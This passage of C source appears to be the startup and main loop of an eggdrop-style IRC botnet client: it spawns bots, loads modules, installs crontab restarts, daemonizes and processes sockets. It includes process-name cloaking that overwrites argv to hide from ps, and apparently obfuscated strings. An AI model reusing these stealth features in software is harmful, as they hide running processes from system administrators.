              } else if (!x)
                sdprintf(STR("%s is already running, pid: %d"), nick, xx);
            } else {
              if (spawnbot(binname, nick, ip, host, ipsix, pscloak))
                printf(STR("* Failed to spawn %s\n"), nick); //This probably won't ever happen.
            }
          }
#endif /* LEAF */
        } 
        free(temp_ptr);
      } /* while(fscan) */
      fclose(f);
#ifdef LEAF
      if (updating)
        exit(0); /* let cron restart us. */
    } /* localhub */
#endif /* LEAF */
  }
  dns_init();
  module_load("channels");
#ifdef LEAF
  module_load("server");
  module_load("irc");
#endif /* LEAF */
  module_load("transfer");
  module_load("share");
  update_init();
  notes_init();
  console_init();
  ctcp_init();
  module_load("compress");

  chanprog();

  clear_tmp();
#ifdef LEAF
  if (localhub) {
    sdprintf(STR("I am localhub (%s)"), origbotname);
#endif /* LEAF */
    check_crontab();
#ifdef LEAF
  }
#endif /* LEAF */


  cache_miss = 0;
  cache_hit = 0;
  if (!pid_file[0])
    egg_snprintf(pid_file, sizeof pid_file, "%s.pid.%s", tempdir, botnetnick);

  if ((localhub && !updating) || !localhub) {
    if ((f = fopen(pid_file, "r")) != NULL) {
      fgets(s, 10, f);
      xx = atoi(s);
      kill(xx, SIGCHLD);
      if (errno != ESRCH) { //!= is PID is running.
        sdprintf(STR("%s is already running, pid: %d"), botnetnick, xx);
        exit(1);
      }
      fclose(f);
    }
  }

#ifdef LEAF
#ifdef S_PSCLOAK
  if (pscloak) {
    int on = 0;
    char *p = progname();

    egg_memset(argv[0], 0, strlen(argv[0]));
    strncpyz(argv[0], p, strlen(p) + 1);
    for (on = 1; on < argc; on++) egg_memset(argv[on], 0, strlen(argv[on]));
  }
#endif /* PSCLOAK */
#endif /* LEAF */

  putlog(LOG_MISC, "*", STR("=== %s: %d users."), botnetnick, count_users(userlist));
  /* Move into background? */

  if (backgrd) {
#ifndef CYGWIN_HACKS
    bg_do_split();
  } else {			/* !backgrd */
#endif /* CYGWIN_HACKS */
    xx = getpid();
    if (xx != 0) {
      /* Write pid to file */
      unlink(pid_file);
      if ((f = fopen(pid_file, "w")) != NULL) {
        fprintf(f, "%u\n", xx);
        if (fflush(f)) {
	  /* Let the bot live since this doesn't appear to be a botchk */
	  printf(EGG_NOWRITE, pid_file);
	  unlink(pid_file);
	  fclose(f);
        } else {
          fclose(f);
        }
      } else
        printf(EGG_NOWRITE, pid_file);
#ifdef CYGWIN_HACKS
      printf(STR("Launched into the background  (pid: %d)\n\n"), xx);
#endif /* CYGWIN_HACKS */
    }
  }

  use_stderr = 0;		/* Stop writing to stderr now */
  if (backgrd) {
    /* Ok, try to disassociate from controlling terminal (finger cross) */
#if HAVE_SETPGID && !defined(CYGWIN_HACKS)
    setpgid(0, 0);
#endif
    /* Tcl wants the stdin, stdout and stderr file handles kept open. */
    freopen("/dev/null", "r", stdin);
    freopen("/dev/null", "w", stdout);
    freopen("/dev/null", "w", stderr);
#ifdef CYGWIN_HACKS
    FreeConsole();
#endif /* CYGWIN_HACKS */
  }

  /* Terminal emulating dcc chat */
  if (!backgrd && term_z) {
    int n = new_dcc(&DCC_CHAT, sizeof(struct chat_info));

    dcc[n].addr = iptolong(getmyip());
    dcc[n].sock = STDOUT;
    dcc[n].timeval = now;
    dcc[n].u.chat->con_flags = conmask;
    dcc[n].u.chat->strip_flags = STRIP_ALL;
    dcc[n].status = STAT_ECHO;
    strcpy(dcc[n].nick, "HQ");
    strcpy(dcc[n].host, "llama@console");
    dcc[n].user = get_user_by_handle(userlist, "HQ");
    /* Make sure there's an innocuous HQ user if needed */
    if (!dcc[n].user) {
      userlist = adduser(userlist, "HQ", "none", "-", USER_ADMIN | USER_OWNER | USER_MASTER | USER_VOICE | USER_OP | USER_PARTY | USER_CHUBA | USER_HUBA);
      dcc[n].user = get_user_by_handle(userlist, "HQ");
    }
    setsock(STDOUT, 0);          /* Entry in net table */
    dprintf(n, "\n### ENTERING DCC CHAT SIMULATION ###\n\n");
    dcc_chatter(n);
  }

  then = now;
  online_since = now;
  autolink_cycle(NULL);		/* Hurry and connect to tandem bots */
  howlong.sec = 1;
  howlong.usec = 0;
  timer_create_repeater(&howlong, (Function) core_secondly);
  add_hook(HOOK_10SECONDLY, (Function) core_10secondly);
  add_hook(HOOK_30SECONDLY, (Function) expire_simuls);
  add_hook(HOOK_MINUTELY, (Function) core_minutely);
  add_hook(HOOK_HOURLY, (Function) core_hourly);
  add_hook(HOOK_HALFHOURLY, (Function) core_halfhourly);
  add_hook(HOOK_REHASH, (Function) event_rehash);
  add_hook(HOOK_PRE_REHASH, (Function) event_prerehash);
  add_hook(HOOK_USERFILE, (Function) event_save);
  add_hook(HOOK_DAILY, (Function) event_resettraffic);

  debug0(STR("main: entering loop"));
  while (1) {
    int socket_cleanup = 0;

    /* Process a single tcl event */
    Tcl_DoOneEvent(TCL_ALL_EVENTS | TCL_DONT_WAIT);

    /* Lets move some of this here, reducing the numer of actual
     * calls to periodic_timers
     */
    now = time(NULL);
    timer_run();
    if (now != then) {		/* Once a second */
/*      call_hook(HOOK_SECONDLY); */
      then = now;
    }

    /* Only do this every so often. */
    if (!socket_cleanup) {
      socket_cleanup = 5;

      /* Remove dead dcc entries. */
      dcc_remove_lost();

      /* Check for server or dcc activity. */
      dequeue_sockets();		
    } else
      socket_cleanup--;

    buf[0] = 0;
    xx = sockgets(buf, &i); 
    /* "chanprog()" bug is down here somewhere.... */
    if (xx >= 0) {		/* Non-error */
      int idx;

      for (idx = 0; idx < dcc_total; idx++)
	if (dcc[idx].sock == xx) {
	  if (dcc[idx].type && dcc[idx].type->activity) {
	    /* Traffic stats */
	    if (dcc[idx].type->name) {
	      if (!strncmp(dcc[idx].type->name, "BOT", 3))
		traffic.in_today.bn += strlen(buf) + 1;
	      else if (!strcmp(dcc[idx].type->name, "SERVER"))
		traffic.in_today.irc += strlen(buf) + 1;
	      else if (!strncmp(dcc[idx].type->name, "CHAT", 4))
		traffic.in_today.dcc += strlen(buf) + 1;
	      else if (!strncmp(dcc[idx].type->name, "FILES", 5))
		traffic.in_today.dcc += strlen(buf) + 1;
	      else if (!strcmp(dcc[idx].type->name, "SEND"))
		traffic.in_today.trans += strlen(buf) + 1;
	      else if (!strncmp(dcc[idx].type->name, "GET", 3))
		traffic.in_today.trans += strlen(buf) + 1;
	      else
		traffic.in_today.unknown += strlen(buf) + 1;
	    }
	    dcc[idx].type->activity(idx, buf, i);
	  } else
	    putlog(LOG_MISC, "*",
		   "!!! untrapped dcc activity: type %s, sock %d",
		   dcc[idx].type->name, dcc[idx].sock);
	  break;
	}
    } else if (xx == -1) {	/* EOF from someone */
      int idx;

      if (i == STDOUT && !backgrd)
	fatal(STR("END OF FILE ON TERMINAL"), 0);
      for (idx = 0; idx < dcc_total; idx++)
	if (dcc[idx].sock == i) {
	  if (dcc[idx].type && dcc[idx].type->eof)
	    dcc[idx].type->eof(idx);
	  else {
	    putlog(LOG_MISC, "*",
		   "*** ATTENTION: DEAD SOCKET (%d) OF TYPE %s UNTRAPPED",
		   i, dcc[idx].type ? dcc[idx].type->name : "*UNKNOWN*");
	    killsock(i);
	    lostdcc(idx);
	  }
	  idx = dcc_total + 1;
	}
      if (idx == dcc_total) {
	putlog(LOG_MISC, "*",
	       "(@) EOF socket %d, not a dcc socket, not anything.", i);
	close(i);
	killsock(i);
      }
    } else if (xx == -2 && errno != EINTR) {	/* select() error */
      putlog(LOG_MISC, "*", STR("* Socket error #%d; recovering."), errno);
      for (i = 0; i < dcc_total; i++) {
	if ((fcntl(dcc[i].sock, F_GETFD, 0) == -1) && (errno = EBADF)) {
	  putlog(LOG_MISC, "*",
		 "DCC socket %d (type %d, name '%s') expired -- pfft",
		 dcc[i].sock, dcc[i].type, dcc[i].nick);
	  killsock(dcc[i].sock);
	  lostdcc(i);
	  i--;
	}
      }
    } else if (xx == -3) {
      call_hook(HOOK_IDLE);
      socket_cleanup = 0;	/* If we've been idle, cleanup & flush */
    }

    if (do_restart) {
      rehash();
      do_restart = 0;
    }
  }
}
